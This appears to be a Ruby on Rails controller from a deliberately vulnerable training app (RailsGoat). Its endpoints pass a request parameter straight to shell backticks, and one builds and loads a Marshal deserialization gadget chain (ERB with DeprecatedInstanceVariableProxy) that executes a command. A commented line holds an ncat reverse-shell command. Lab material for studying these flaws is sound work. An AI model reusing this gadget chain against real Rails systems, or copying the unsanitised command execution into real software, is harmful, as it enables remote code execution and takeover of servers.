require "base64"
require "erb"

class ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy
  def initialize(instance, method)
    @instance = instance
    @method = method
    @deprecator = ActiveSupport::Deprecation
  end
end

# root@railsgoat-ruby401-rails710-949df54f9-nnglk:/myapp# readelf -a /usr/local/lib/libruby.so.4.0 | grep rb_marshal_
# 000000873240  08be00000007 R_X86_64_JUMP_SLO 00000000001e8ad0 rb_marshal_define[...] + 0
#   1153: 00000000001e8fb0    10 FUNC    GLOBAL DEFAULT   12 rb_marshal_dump
#   1353: 00000000001e8fc0    12 FUNC    GLOBAL DEFAULT   12 rb_marshal_load
#   2238: 00000000001e8ad0   329 FUNC    GLOBAL DEFAULT   12 rb_marshal_defin[...]
#   3078: 00000000001e83e0   722 FUNC    LOCAL  DEFAULT   12 rb_marshal_load_[...]
#   3081: 000000000006f0d2    37 FUNC    LOCAL  DEFAULT   12 rb_marshal_load_[...]
#   3083: 00000000001e8790   640 FUNC    LOCAL  DEFAULT   12 rb_marshal_dump_[...]
#  19703: 00000000001e8ad0   329 FUNC    GLOBAL DEFAULT   12 rb_marshal_defin[...]
#  20134: 00000000001e8fc0    12 FUNC    GLOBAL DEFAULT   12 rb_marshal_load
#  20178: 00000000001e8fb0    10 FUNC    GLOBAL DEFAULT   12 rb_marshal_dump
module CMarshal

  def CMarshal.rb_marshal_dump(data)
    return Marshal.dump(data)
  end

  def CMarshal.rb_marshal_load(cmd, data)
    puts "running command:", cmd
    output = `#{cmd}`
    puts "command output:", output
    return Marshal.load(data)
  end

end

class RceController < ApplicationController

  def rce
    @cmd = params[:cmd]

    x = Marshal.dump("test")
    xx = Marshal.load(x)
    puts "loaded:", xx

    y = CMarshal.rb_marshal_dump("text")
    yy = CMarshal.rb_marshal_load(@cmd, y)
    puts "loaded:", yy
  end

  def rce_simple
    puts "lets run some commands", params[:cmd]
    @cmd = params[:cmd]
    @output = `#{@cmd}`
    puts "command output", @output
  end

  # accept command or just attack
  def rce_marshal
    puts "lets play with Marshal.load ... and Base64.decode"
    @cmd = params[:cmd]
    # code = '`ncat 127.0.0.1 1234 -v -e /bin/bash 2>&1`'
    code = '`touch /tmp/pwned`'
    erb = ERB.allocate
    erb.instance_variable_set :@src, code
    erb.instance_variable_set :@filename, "1"
    erb.instance_variable_set :@lineno, 1

    ggez = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result
    @payload = Base64.encode64(Marshal.dump(ggez)).gsub("\n", "")

    Marshal.load(Base64.decode64(@payload))
    puts "you are done my friend"

  end
end
